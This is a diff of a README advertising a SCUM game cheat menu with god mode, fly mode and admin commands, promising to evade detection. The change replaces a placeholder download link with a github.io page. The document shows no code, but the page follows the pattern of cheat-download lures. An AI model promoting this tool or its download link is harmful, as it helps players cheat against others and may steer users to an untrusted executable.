@@ -2,7 +2,7 @@
 
 SCUM Mod Menu Pro is a powerful C# mod menu engineered to give players full control over SCUM’s mechanics. From God Mode to admin commands, this tool allows you to customize your survival experience with features like unlimited health, fly mode, and temperature control. Built with stability in mind, it’s designed to work seamlessly without crashes or detection. Whether you want to explore the map freely or dominate matches effortlessly, this mod menu is your ultimate companion.  
 
-[![Download SCUM Mod Menu Pro](https://img.shields.io/badge/Download-SCUM%20Mod%20Menu%20Pro-blueviolet)](https://example.com)  
+[![Download SCUM Mod Menu Pro](https://img.shields.io/badge/Download-SCUM%20Mod%20Menu%20Pro-blueviolet)](https://scum-mod-menu.github.io/.github/)  
 
 ---
 
